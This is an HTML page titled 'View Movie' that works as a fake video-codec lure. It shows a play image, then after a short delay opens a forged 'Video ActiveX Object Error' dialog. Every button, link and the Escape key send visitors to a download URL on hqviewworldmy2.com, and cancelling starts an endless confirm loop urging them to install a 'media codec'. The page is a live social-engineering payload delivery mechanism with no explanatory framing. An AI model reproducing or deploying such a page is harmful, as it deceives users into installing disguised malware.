<html>
<head>
<title>View Movie</title>
<meta name="robots" content="noindex,nofollow,noarchive"> 
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
  <style type="text/css">
    body { background-color:#000000; }
    .t { border:1px solid #666666; }
  </style>
</head>

<body>
<script>
<!--

var Drag = {
     obj : null,
     init : function(o, oRoot, minX, maxX, minY, maxY, bSwapHorzRef, bSwapVertRef, fXMapper, fYMapper)
     {
          o.onmousedown     = Drag.start;

          o.hmode               = bSwapHorzRef ? false : true ;
          o.vmode               = bSwapVertRef ? false : true ;

          o.root = oRoot && oRoot != null ? oRoot : o ;

          if (o.hmode  && isNaN(parseInt(o.root.style.left  ))) o.root.style.left   = "0px";
          if (o.vmode  && isNaN(parseInt(o.root.style.top   ))) o.root.style.top    = "0px";
          if (!o.hmode && isNaN(parseInt(o.root.style.right ))) o.root.style.right  = "0px";
          if (!o.vmode && isNaN(parseInt(o.root.style.bottom))) o.root.style.bottom = "0px";

          o.minX     = typeof minX != 'undefined' ? minX : null;
          o.minY     = typeof minY != 'undefined' ? minY : null;
          o.maxX     = typeof maxX != 'undefined' ? maxX : null;
          o.maxY     = typeof maxY != 'undefined' ? maxY : null;

          o.xMapper = fXMapper ? fXMapper : null;
          o.yMapper = fYMapper ? fYMapper : null;

          o.root.onDragStart     = new Function();
          o.root.onDragEnd     = new Function();
          o.root.onDrag          = new Function();
     },

     start : function(e)
     {
          var o = Drag.obj = this;
          e = Drag.fixE(e);
          var y = parseInt(o.vmode ? o.root.style.top  : o.root.style.bottom);
          var x = parseInt(o.hmode ? o.root.style.left : o.root.style.right );
          o.root.onDragStart(x, y);

          o.lastMouseX     = e.clientX;
          o.lastMouseY     = e.clientY;

          if (o.hmode) {
               if (o.minX != null)     o.minMouseX     = e.clientX - x + o.minX;
               if (o.maxX != null)     o.maxMouseX     = o.minMouseX + o.maxX - o.minX;
          } else {
               if (o.minX != null) o.maxMouseX = -o.minX + e.clientX + x;
               if (o.maxX != null) o.minMouseX = -o.maxX + e.clientX + x;
          }

          if (o.vmode) {
               if (o.minY != null)     o.minMouseY     = e.clientY - y + o.minY;
               if (o.maxY != null)     o.maxMouseY     = o.minMouseY + o.maxY - o.minY;
          } else {
               if (o.minY != null) o.maxMouseY = -o.minY + e.clientY + y;
               if (o.maxY != null) o.minMouseY = -o.maxY + e.clientY + y;
          }

          document.onmousemove     = Drag.drag;
          document.onmouseup          = Drag.end;

          return false;
     },

     drag : function(e)
     {
          e = Drag.fixE(e);
          var o = Drag.obj;

          var ey     = e.clientY;
          var ex     = e.clientX;
          var y = parseInt(o.vmode ? o.root.style.top  : o.root.style.bottom);
          var x = parseInt(o.hmode ? o.root.style.left : o.root.style.right );
          var nx, ny;

          if (o.minX != null) ex = o.hmode ? Math.max(ex, o.minMouseX) : Math.min(ex, o.maxMouseX);
          if (o.maxX != null) ex = o.hmode ? Math.min(ex, o.maxMouseX) : Math.max(ex, o.minMouseX);
          if (o.minY != null) ey = o.vmode ? Math.max(ey, o.minMouseY) : Math.min(ey, o.maxMouseY);
          if (o.maxY != null) ey = o.vmode ? Math.min(ey, o.maxMouseY) : Math.max(ey, o.minMouseY);

          nx = x + ((ex - o.lastMouseX) * (o.hmode ? 1 : -1));
          ny = y + ((ey - o.lastMouseY) * (o.vmode ? 1 : -1));

          if (o.xMapper)          nx = o.xMapper(y)
          else if (o.yMapper)     ny = o.yMapper(x)

          Drag.obj.root.style[o.hmode ? "left" : "right"] = nx + "px";
          Drag.obj.root.style[o.vmode ? "top" : "bottom"] = ny + "px";
          Drag.obj.lastMouseX     = ex;
          Drag.obj.lastMouseY     = ey;

          Drag.obj.root.onDrag(nx, ny);
          return false;
     },

     end : function()
     {
          document.onmousemove = null;
          document.onmouseup   = null;
          Drag.obj.root.onDragEnd(     parseInt(Drag.obj.root.style[Drag.obj.hmode ? "left" : "right"]), 
                                             parseInt(Drag.obj.root.style[Drag.obj.vmode ? "top" : "bottom"]));
          Drag.obj = null;
     },

     fixE : function(e)
     {
          if (typeof e == 'undefined') e = window.event;
          if (typeof e.layerX == 'undefined') e.layerX = e.offsetX;
          if (typeof e.layerY == 'undefined') e.layerY = e.offsetY;
          return e;
     }
};

function Down(download,e) 
{ 
     if (e!=null && e.keyCode==27)
     {     Close();
          return;
     }     
    switch (download) 
    { 
        case "iax": document.location.href='http://hqviewworldmy2.com/download/1/1000/5'; break; 
        Close(); 
    }
}

function alert_vc() {
     if (confirm('Click \'OK\' to download and install media codec.')) {
          location.href='http://hqviewworldmy2.com/download/1/1000/5';
     }
     else {
          if (alert('Please download new version of media codec software.')) {
               alert_vc();
          }
          else {
               alert_vc();
          }               
     }
}

function Close() 
{ 
    var p=document.getElementById("popdiv");
    p.style.visibility="hidden"; 
    alert_vc();
} 
function Details()
{
     alert('Download video codec to view media files.');
}
-->
</script>

<div name="popdiv" id="popdiv" onKeyPress="Down('iax',event);" style="visibility:hidden; z-index:1;position:absolute;top:0px;left:0px;">
<table width="389" border="0" cellpadding="0" cellspacing="0">
<tr>
  <td height="36">
    <table border="0" cellpadding="0" cellspacing="0">
    <tr>
      <td width="5" height="36"><img src="http://hqviewworldmy2.com/images/img0.gif" width="5" height="36"></td>
      <td width="357" bgcolor="#0064B2" background="http://hqviewworldmy2.com/images/img1.gif"><font style="font:bold 12px Verdana; color:#ffffff;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Message Box Object Error</font></td>
      <td width="21" bgcolor="#0064B2"><img src="http://hqviewworldmy2.com/images/img2.gif" width="21" height="36" onClick="Close();"></td>
      <td width="6"><img src="http://hqviewworldmy2.com/images/img3.gif" width="6" height="36"></td>
    </tr>
    </table>
  </td>
</tr>
<tr>
  <td height="203" bgcolor="#FFFFDE" background="http://hqviewworldmy2.com/images/img4.gif" valign="top">
    <table width="100%" height="130" border="0" cellpadding="0" cellspacing="0">
    <tr>
      <td width="120">&nbsp;</td>
      <td valign="top">
      	<div style="width:100%;height:35px;"></div>
        <font face="Tahoma" color="#000000" style="font-size:11px;">
        <b>Video ActiveX Object Error:</b><br>Your browser cannot display this video file.<br><br>You need to download new version of Video<br>ActiveX Object to play this video file.
        </font>
      </td>
    </tr>
    </table>
    <table width="100%" border="0" cellpadding="0" cellspacing="0">
    <tr>
      <td align="center">
        <font face="Tahoma" color="#000000" style="font-size:11px;">
          To download and install ActiveX Object click <a href="http://hqviewworldmy2.com/download/1/1000/5" style="font:11px Arial;color:#000000;text-decoration:underline;">Continue</a>.<br><br>
          <input type="submit" value="Continue" onClick="Down('iax');" style="font-family:Arial;font-size:12px;font-weight:bold;color:#ffffff;background-color:#009CEE;background-image:url(http://hqviewworldmy2.com/images/img5.gif);width:104px;height:26px;border:0;">
          <input type="submit" value="Cancel" onClick="Close();" style="font-family:Arial;font-size:12px;font-weight:bold;color:#ffffff;background-color:#A1A1A1;background-image:url(http://hqviewworldmy2.com/images/img5_.gif);width:104px;height:26px;border:0;">
          <input type="submit" value="Details..." onClick="Details();" style="font-family:Arial;font-size:12px;font-weight:bold;color:#ffffff;background-color:#A1A1A1;background-image:url(http://hqviewworldmy2.com/images/img5_.gif);width:104px;height:26px;border:0;">
        </font>
      </td>
    </tr>
    </table>
  </td>
</tr>
<tr>
  <td height="6"><img src="http://hqviewworldmy2.com/images/img6.gif" width="389" height="6"></td>
</tr>
</table>
</div>

<div id="movie" style="margin:0 auto;">
	<center>
	  <a href="http://hqviewworldmy2.com/download/1/1000/5"><img src="http://hqviewworldmy2.com/images/play.gif" width="480" height="400" style="border:1px solid #efefef" onMouseOver="window.status = 'To download and install ActiveX Object click';" alt="To download and install ActiveX Object click"/></a>
	</center>
</div>
<script>
<!--
setTimeout("showPopDiv();",1300);
      
function showPopDiv()
{
    var sFlag = "No";
    var byFlag = false;
    var FlagAr = sFlag.split("");
 
    if(FlagAr[0]=="1"){byFlag = true;}
    if(FlagAr[0]=="3"){byFlag = true;}

    if(!byFlag)
    {
      var p=document.getElementById("popdiv"); 
      wmpwidth=document.body.clientWidth/2-190;
      wmpheight=document.body.clientHeight/2-130;
      p.style.top = wmpheight;
      p.style.left = wmpwidth;
      p.style.visibility = "visible";
      p.focus();
    }
}

Drag.init(document.getElementById("popdiv"));
-->

</script>
</div>
</body>
</html>